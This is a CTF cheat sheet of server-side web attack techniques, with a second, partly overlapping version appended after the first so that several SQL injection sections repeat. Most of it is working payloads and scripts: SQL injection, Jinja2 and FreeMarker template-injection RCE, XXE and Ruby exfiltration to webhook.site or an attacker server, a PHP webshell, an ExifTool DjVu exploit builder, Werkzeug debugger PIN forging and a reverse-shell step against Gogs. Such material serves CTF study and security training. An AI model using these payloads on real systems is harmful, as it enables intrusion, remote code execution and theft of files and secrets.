# CTF Web - Server-Side Attacks

## Table of Contents
- [SQL Injection](#sql-injection)
  - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
  - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
  - [Second-Order SQL Injection](#second-order-sql-injection)
  - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
  - [SQLi → SSTI Chain](#sqli-ssti-chain)
  - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go Template Injection](#go-template-injection)
  - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
- [SSRF](#ssrf)
  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
  - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
- [XXE (XML External Entity)](#xxe-xml-external-entity)
  - [Basic XXE](#basic-xxe)
  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
- [Command Injection](#command-injection)
  - [Newline Bypass](#newline-bypass)
  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
- [Ruby Code Injection](#ruby-code-injection)
  - [instance_eval Breakout](#instance_eval-breakout)
  - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
  - [Exfiltration](#exfiltration)
- [Perl open() RCE](#perl-open-rce)
- [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
- [ReDoS as Timing Oracle](#redos-as-timing-oracle)
- [API Filter/Query Parameter Injection](#api-filterquery-parameter-injection)
- [HTTP Response Header Data Hiding](#http-response-header-data-hiding)
- [File Upload → RCE Techniques](#file-upload-rce-techniques)
  - [.htaccess Upload Bypass](#htaccess-upload-bypass)
  - [PHP Log Poisoning](#php-log-poisoning)
  - [Python .so Hijacking (by Siunam)](#python-so-hijacking-by-siunam)
  - [Gogs Symlink RCE (CVE-2025-8110)](#gogs-symlink-rce-cve-2025-8110)
  - [ZipSlip + SQLi](#zipslip-sqli)
- [PHP Deserialization from Cookies](#php-deserialization-from-cookies)
- [WebSocket Mass Assignment](#websocket-mass-assignment)
- [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204-djvu-perl-injection-0xfun-2026)
- [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch-command-injection-vuwctf-2025)
- [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
- [Path Traversal Bypass Techniques](#path-traversal-bypass-techniques)
  - [Brace Stripping](#brace-stripping)
  - [Double URL Encoding](#double-url-encoding)
  - [Python os.path.join](#python-ospathjoin)
- [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
- [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
- [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)

---

## SQL Injection

### Backslash Escape Quote Bypass
```bash
# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
# With username=\ : WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

### Hex Encoding for Quote Bypass
```sql
SELECT 0x6d656f77;  -- Returns 'meow'
-- Combined with UNION for SSTI injection:
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

### Second-Order SQL Injection
**Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
1. Register with malicious username: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. Login normally
3. View profile → injected SQL executes in query using stored username

### SQLi LIKE Character Brute-Force
```python
password = ""
for pos in range(length):
    for c in string.printable:
        payload = f"' OR password LIKE '{password}{c}%' --"
        if oracle(payload):
            password += c; break
```

### SQLi → SSTI Chain
When SQLi result gets rendered in a template:
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# Final: username=x\&password=) union select 1, {hex_payload}#
```

### MySQL information_schema.processList Trick
```sql
SELECT info FROM information_schema.processList WHERE id=connection_id()
SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
```

---

## SSTI (Server-Side Template Injection)

### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Without quotes (use bytes):
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug:
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Go Template Injection
```go
{{.ReadFile "/flag.txt"}}
```

### EJS Server-Side Template Injection
**Pattern (Checking It Twice):** User input passed to `ejs.render()` in error paths.
```
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

### FreeMarker SSTI (Java)

**Detection:** `${7*7}` returns `49`. Confirm with `${"test"?upper_case}` → `TEST`.

**Standard RCE payload:**
```java
${"freemarker.template.utility.Execute"?new()("id")}
```

**Parentheses Filter Bypass (Happy Face pattern):**

When `(` is filtered/replaced (e.g., `:-(` → `:-)`), use `?j_string` + `?eval` to construct parentheses:

```java
# Get backslash via j_string ('"'?j_string returns \")
${'"'?j_string[0]}  # → returns \

# Get open parenthesis via hex escape + eval
${['"' + '"'?j_string[0] + 'x28"'][0]?eval}  # → returns (

# Full RCE payload bypassing ( filter:
${["'freemarker.template.utility.Execute'?new" +
    ['"' + '"'?j_string[0] + 'x28"'][0]?eval +
    ")" +
    ['"' + '"'?j_string[0] + 'x28"'][0]?eval +
    '"/app/get_flag")'
][0]?eval}
```

**Key insight:** Challenge name often hints at filter behavior (e.g., "Happy Face" = sad→happy = `(`→`)`). Always test individual characters to identify filters before crafting bypass.

**Pre-exploitation checklist:**
1. Test `${7*7}`, `#{7*7}`, `{{7*7}}` to identify engine
2. Test `${"test"?upper_case}` to confirm FreeMarker
3. Send `( ) < > \ " '` individually to detect character filters
4. Use `?eval` built-in to construct filtered characters from hex escapes

---

## SSRF

### DNS Rebinding for TOCTOU
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl Redirect Chain Bypass
After `CURLOPT_MAXREDIRS` exceeded, some implementations make one more unvalidated request:
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // NO VALIDATION
    curl_easy_perform(curl);
```

---

## XXE (XML External Entity)

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB XXE with External DTD
Host evil.dtd:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

---

## Command Injection

### Newline Bypass
```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### Incomplete Blocklist Bypass
When cat/head/less blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
Common missed: `;` semicolons, backticks, `$()` substitution

---

## Ruby Code Injection

### instance_eval Breakout
```ruby
# Template: apply_METHOD('VALUE')
# Inject VALUE as: valid');PAYLOAD#
# Result: apply_METHOD('valid');PAYLOAD#')
```

### Bypassing Keyword Blocklists
| Blocked | Alternative |
|---------|-------------|
| `File.read` | `Kernel#open` or class helper methods |
| `File.write` | `open('path','w'){|f|f.write(data)}` |
| `system`/`exec` | `open('\|cmd')`, `%x[cmd]`, `Process.spawn` |
| `IO` | `Kernel#open` |

### Exfiltration
```ruby
open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
# Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
```

---

## Perl open() RCE
Legacy 2-argument `open()` allows command injection:
```perl
open(my $fh, $user_controlled_path);  # 2-arg open interprets mode chars
# Exploit: "|command_here" or "command|"
```

---

## Server-Side JS eval Blocklist Bypass

**Bypass via string concatenation in bracket notation:**
```javascript
row['con'+'structor']['con'+'structor']('return this')()
// Also: template literals, String.fromCharCode, reverse string
```

---

## ReDoS as Timing Oracle

**Pattern (0xClinic):** Match user-supplied regex against file contents. Craft exponential-backtracking regexes that trigger only when a character matches.

```python
def leak_char(known_prefix, position):
    for c in string.printable:
        pattern = f"^{re.escape(known_prefix + c)}(a+)+$"
        start = time.time()
        resp = requests.post(url, json={"title": pattern})
        if time.time() - start > threshold:
            return c
```

**Combine with path traversal** to target `/proc/1/environ` (secrets), `/proc/self/cmdline`.

---

## API Filter/Query Parameter Injection

**Pattern (Poacher Supply Chain):** API accepts JSON filter. Adding extra fields exposes internal data.
```bash
# UI sends: filter={"region":"all"}
# Inject:   filter={"region":"all","caseId":"*"}
# May return: case_detail, notes, proof codes
```

---

## HTTP Response Header Data Hiding

Proof/flag in custom response headers (e.g., `x-archive-tag`, `x-flag`):
```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

---

## File Upload → RCE Techniques

### .htaccess Upload Bypass
1. Upload `.htaccess`: `AddType application/x-httpd-php .lol`
2. Upload `rce.lol`: `<?php system($_GET['cmd']); ?>`
3. Access `rce.lol?cmd=cat+flag.txt`

### PHP Log Poisoning
1. PHP payload in User-Agent header
2. Path traversal to include: `....//....//....//var/log/apache2/access.log`

### Python .so Hijacking (by Siunam)
1. Compile: `gcc -shared -fPIC -o auth.so malicious.c` with `__attribute__((constructor))`
2. Upload via path traversal: `{"filename": "../utils/auth.so"}`
3. Delete .pyc to force reimport: `{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}`

Reference: https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/

### Gogs Symlink RCE (CVE-2025-8110)
1. Create repo, `ln -s .git/config malicious_link`, push
2. API update `malicious_link` → overwrites `.git/config`
3. Inject `core.sshCommand` with reverse shell

### ZipSlip + SQLi
Upload zip with symlinks for file read, path traversal for file write.

---

## PHP Deserialization from Cookies
```php
O:8:"FilePath":1:{s:4:"path";s:8:"flag.txt";}
```
Replace cookie with base64-encoded malicious serialized data.

---

## WebSocket Mass Assignment
```json
{"username": "user", "isAdmin": true}
```
Handler doesn't filter fields → privilege escalation.

---

## ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)

**Affected:** ExifTool ≤ 12.23

**Vulnerability:** DjVu ANTa annotation chunk parsed with Perl `eval`.

**Craft minimal DjVu exploit:**
```python
import struct

def make_djvu_exploit(command):
    # ANTa chunk with Perl injection
    ant_data = f'(metadata "\\c${{{command}}}")'.encode()

    # INFO chunk (1x1 image)
    info = struct.pack('>HHBBii', 1, 1, 24, 0, 300, 300)

    # Build DJVU FORM
    djvu_body = b'DJVU'
    djvu_body += b'INFO' + struct.pack('>I', len(info)) + info
    if len(info) % 2: djvu_body += b'\x00'
    djvu_body += b'ANTa' + struct.pack('>I', len(ant_data)) + ant_data
    if len(ant_data) % 2: djvu_body += b'\x00'

    # FORM header
    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
    return djvu

exploit = make_djvu_exploit("system('cat /flag.txt')")
with open('exploit.djvu', 'wb') as f:
    f.write(exploit)
```

**Detection:** Check ExifTool version. DjVu format is the classic vector. Upload the crafted DjVu to any endpoint that processes images with ExifTool.

---

## Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)

**Pattern (Go Go Cyber Ranger):** Go validates `len([]rune(input)) > 32` but copies `len([]byte(input))` bytes.

**Key insight:** Multi-byte UTF-8 chars (emoji = 4 bytes) count as 1 rune but 4 bytes → overflow.

**Exploit:** 8 emoji (32 bytes, 8 runes) + `";cmd\n"` = 40 bytes total, passes 32-rune check but overflows into adjacent buffer.

```bash
# If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
# Inject: ";od f*\n"
payload='🔥🔥🔥🔥🔥🔥🔥🔥";od f*\n'
curl -X POST http://target/check -d "secret=$payload"
```

**Detection:** Go web app with length check on `[]rune` followed by byte-level operations (copy, buffer write). Always check for rune/byte mismatch in Go.

---

## Zip Symlink Path Traversal (UTCTF 2024)

**Pattern (Schrödinger):** Server extracts uploaded ZIP without checking symlinks.

```bash
# Create symlink to target file, zip with -y to preserve
ln -s /path/to/flag.txt file.txt
zip -y exploit.zip file.txt
# Upload → server follows symlink → exposes file content
```

**Detection:** Any upload+extract endpoint. `zip -y` preserves symlinks. Many zip extraction utilities follow symlinks by default.

---

## Path Traversal Bypass Techniques

### Brace Stripping
`{.}{.}/flag.txt` → `../flag.txt` after processing

### Double URL Encoding
`%252E%252E%252F` → `../` after two decode passes

### Python os.path.join
`os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)

---

## Flask/Werkzeug Debug Mode Exploitation

**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.

**Attack chain:**
1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
   ```bash
   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
   # Or brute-force programmatically:
   for word in wordlist:
       try:
           data = decode_flask_cookie(cookie, word)
           print(f"Secret: {word}, Data: {data}")
       except: pass
   ```
2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
   ```bash
   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
   ```
3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request

**Werkzeug debugger RCE:** If `/console` is accessible:
1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
3. **Compute PIN cookie:**
   ```python
   import hashlib
   h = hashlib.sha1()
   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
       h.update(bit.encode() if isinstance(bit, str) else bit)
   h.update(b"cookiesalt")
   cookie_name = "__wzd" + h.hexdigest()[:20]
   h.update(b"pinsalt")
   num = f"{int(h.hexdigest(), 16):09d}"[:9]
   pin = "-".join([num[:3], num[3:6], num[6:]])
   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
   ```
4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
   ```python
   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
   # SSRF to gopher_url
   ```

**Key insight:** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.

---

## XXE with External DTD Filter Bypass

**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.

**Technique:** Host malicious DTD on webhook.site or attacker server:
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.

**Setup with webhook.site API:**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

---

## Path Traversal: URL-Encoded Slash Bypass

**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.

---

## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)

**Pattern (Web 2 Doc 1/2):** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.

### Variant 1: Blind SSRF via Attachment Oracle
WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.

**Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
```python
# Check for embedded attachment in PDF
def has_attachment(pdf_bytes):
    return b"/Type /EmbeddedFile" in pdf_bytes

# Blind extraction via charCodeAt oracle
for i in range(flag_len):
    for ch in charset:
        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
        pdf = convert_url_to_pdf(host_html(html))
        if has_attachment(pdf):
            flag += ch; break
```

### Variant 2: Local File Read via file:// Attachment
```html
<!-- Host this HTML, submit URL to converter -->
<link rel="attachment" href="file:///flag.txt">
```
**Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`

**Key insight:** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.

---

## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)

**Pattern (CVE DB):** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.

**Injection payload:**
```
a^/)||(<JS_CONDITION>)&&(/a^
```
This breaks the regex context and injects a boolean condition. Result count reveals truth value.

**Binary search extraction:**
```python
def oracle(condition):
    # Inject into regex context
    payload = f"a^/)||(({condition}))&&(/a^"
    html = post_search(payload)
    return parse_result_count(html) > 0

# Find flag length
lo, hi = 1, 256
while lo < hi:
    mid = (lo + hi + 1) // 2
    if oracle(f"this.product.length>{mid}"): lo = mid
    else: hi = mid - 1
length = lo + 1

# Extract each character
for i in range(length):
    l, h = 31, 126
    while l < h:
        m = (l + h + 1) // 2
        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
        else: h = m - 1
    flag += chr(l + 1)
```

**Detection:** Unsanitized input in MongoDB `$regex` or `$where`. Test with `a/)||true&&(/a` vs `a/)||false&&(/a` -- different result counts confirm injection.

---

## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)

**Pattern (WordPress Static Site Generator):** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.

**Attack chain:**
1. Upload file containing: `{% include "/flag.txt" %}`
2. Get upload ID from session cookie (base64 decode, extract hex ID)
3. Request render with traversal: `/generate?template=../uploads/<id>/pwn`

**Pongo2 SSTI payloads:**
```
{% include "/etc/passwd" %}
{% include "/flag.txt" %}
{{ "test" | upper }}
```

**Detection:** Go web app with template rendering + file upload. Check for `pongo2`, `jet`, or standard `html/template` in source.

---

## ZIP Upload with PHP Webshell (Nullcon 2026)

**Pattern (virus_analyzer):** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.

**Exploit:**
```bash
# Create PHP webshell
echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
zip payload.zip shell.php
curl -F 'zipfile=@payload.zip' http://target/
# Access: http://target/uploads/<id>/shell.php
```

**Variants:**
- If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
- If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
- Race condition: file may be deleted after extraction -- access immediately

---

## basename() Bypass for Hidden Files (Nullcon 2026)

**Pattern (Flowt Theory 2):** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.

**Exploit:**
```bash
# basename() allows .lock, .htaccess, etc.
curl "http://target/?view_receipt=.lock"
# .lock reveals secret filename
curl "http://target/?view_receipt=secret_XXXXXXXX"
```

**Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.


<!-- APPENDED FROM LATEST UPDATE: ctf-web/server-side.md -->

# CTF Web - Server-Side Injection Attacks

## Table of Contents
- [PHP Type Juggling](#php-type-juggling)
- [PHP File Inclusion / php://filter](#php-file-inclusion--phpfilter)
- [SQL Injection](#sql-injection)
  - [Backslash Escape Quote Bypass](#backslash-escape-quote-bypass)
  - [Hex Encoding for Quote Bypass](#hex-encoding-for-quote-bypass)
  - [Second-Order SQL Injection](#second-order-sql-injection)
  - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
  - [MySQL Column Truncation (VolgaCTF 2014)](#mysql-column-truncation-volgactf-2014)
  - [SQLi to SSTI Chain](#sqli-to-ssti-chain)
  - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
  - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
  - [SQLi via EXIF Metadata Injection (29c3 CTF 2012)](#sqli-via-exif-metadata-injection-29c3-ctf-2012)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go Template Injection](#go-template-injection)
  - [EJS Server-Side Template Injection](#ejs-server-side-template-injection)
  - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
  - [Mako SSTI](#mako-ssti)
  - [Twig SSTI](#twig-ssti)
  - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
- [SSRF](#ssrf)
  - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
  - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
- [XXE (XML External Entity)](#xxe-xml-external-entity)
  - [Basic XXE](#basic-xxe)
  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
- [Command Injection](#command-injection)
  - [Newline Bypass](#newline-bypass)
  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)

For code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI, SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS), see [server-side-exec.md](server-side-exec.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

---

## PHP Type Juggling

**Pattern:** PHP loose comparison (`==`) performs implicit type conversion, leading to unexpected equality results that bypass authentication and validation checks.

**Comparison table (all `true` with `==`):**
| Comparison | Result | Why |
|-----------|--------|-----|
| `0 == "php"` | `true` | Non-numeric string converts to `0` |
| `0 == ""` | `true` | Empty string converts to `0` |
| `"0" == false` | `true` | `"0"` is falsy |
| `NULL == false` | `true` | Both falsy |
| `NULL == ""` | `true` | Both falsy |
| `NULL == array()` | `true` | Both empty |
| `"0e123" == "0e456"` | `true` | Both parse as `0` in scientific notation |

**Auth bypass with type juggling:**
```php
// Vulnerable: if ($input == $password)
// If $password starts with "0e" followed by digits (MD5 "magic hashes"):
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")  = "0e830400451993494058024219903391"
// Both compare as 0 == 0 → true
```

**Exploit via JSON type confusion:**
```bash
# Send integer 0 instead of string to bypass strcmp/==
curl -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**Array bypass for strcmp:**
```bash
# strcmp(array, string) returns NULL, which == 0 == false
curl http://target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
```

**Prevention:** Use strict comparison (`===`) which checks both value and type.

**Key insight:** Always test `0`, `""`, `NULL`, `[]`, and `"0e..."` magic hash values against PHP comparison endpoints. JSON `Content-Type` allows sending integer `0` where the application expects a string.

---

## PHP File Inclusion / php://filter

**Pattern:** PHP `include`, `require`, `require_once` accept dynamic paths. Combined with `php://filter`, leak source code without execution.

**Basic LFI:**
```php
// Vulnerable: include($_GET['page'] . ".php");
// Exploit: page=../../../../etc/passwd%00  (null byte, PHP < 5.3.4)
// Modern: page=php://filter/convert.base64-encode/resource=index
```

**Source code disclosure via php://filter:**
```bash
# Base64-encode prevents PHP execution, leaks raw source
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# Output: <?php $password = "s3cr3t"; ...
```

**Filter chains for RCE (PHP >= 7):**
```bash
# Chain convert filters to write arbitrary content
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
```

**Common LFI targets:**
```text
/etc/passwd                          # User enumeration
/proc/self/environ                   # Environment variables (secrets)
/proc/self/cmdline                   # Process command line
/var/log/apache2/access.log          # Log poisoning vector
/var/www/html/config.php             # Application secrets
php://filter/convert.base64-encode/resource=index  # Source code
```

**Key insight:** `php://filter/convert.base64-encode/resource=` is the most reliable way to read PHP source code through an LFI — base64 encoding prevents the included file from being executed as PHP.

---

## SQL Injection

### Backslash Escape Quote Bypass
```bash
# Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
# With username=\ : WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

### Hex Encoding for Quote Bypass
```sql
SELECT 0x6d656f77;  -- Returns 'meow'
-- Combined with UNION for SSTI injection:
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

### Second-Order SQL Injection
**Pattern (Second Breakfast):** Inject SQL in username during registration, triggers on profile view.
1. Register with malicious username: `' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. Login normally
3. View profile → injected SQL executes in query using stored username

```python
import requests

s = requests.Session()

# Step 1: Store malicious payload (safely escaped during INSERT)
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "password": "anything"
})

# Step 2: Trigger — payload retrieved from DB and used unsafely
# Common triggers: password change, profile update, search using stored value
s.post("https://target.com/change-password", data={
    "old_password": "anything",
    "new_password": "hacked"
})
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
# Result: admin password changed
```

**Key insight:** Second-order SQLi occurs when input is safely stored but later retrieved and used in a new query without escaping. Look for registration→profile update flows, stored preferences used in queries, or any feature that reads back user-controlled data from the database.

### SQLi LIKE Character Brute-Force
```python
password = ""
for pos in range(length):
    for c in string.printable:
        payload = f"' OR password LIKE '{password}{c}%' --"
        if oracle(payload):
            password += c; break
```

### MySQL Column Truncation (VolgaCTF 2014)

**Pattern:** Registration form backed by MySQL `VARCHAR(N)`. MySQL silently truncates strings longer than N characters, and ignores trailing spaces in string comparison. Register as `"admin" + spaces + junk` to create a duplicate "admin" row with an attacker-controlled password.

```bash
# VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
# MySQL truncates to "admin               " → matches "admin" in comparisons

# Register duplicate admin with attacker password
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'

# Login as admin with attacker password
curl -X POST http://target/login -d 'login=admin&password=attacker123'
```

**Why it works:**
1. MySQL `VARCHAR(N)` truncates input to N characters on INSERT
2. MySQL ignores trailing spaces in `=` comparisons (SQL standard PAD SPACE behavior)
3. `"admin" + 50 spaces + "x"` truncates to `"admin" + spaces` → matches `"admin"`
4. The application now has two rows matching "admin" — the original and the attacker's

**Key insight:** MySQL's PAD SPACE collation means `"admin" = "admin     "` evaluates to true. Combined with silent `VARCHAR` truncation, registering with a space-padded username creates a second account that the application treats as the original admin. This bypasses registration duplicate checks that use `WHERE username = ?` (since the padded version isn't an exact match before truncation). Fixed in MySQL 8.0+ with `NO_PAD` collations.

### SQLi to SSTI Chain
When SQLi result gets rendered in a template:
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# Final: username=x\&password=) union select 1, {hex_payload}#
```

### MySQL information_schema.processList Trick
```sql
SELECT info FROM information_schema.processList WHERE id=connection_id()
SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
```

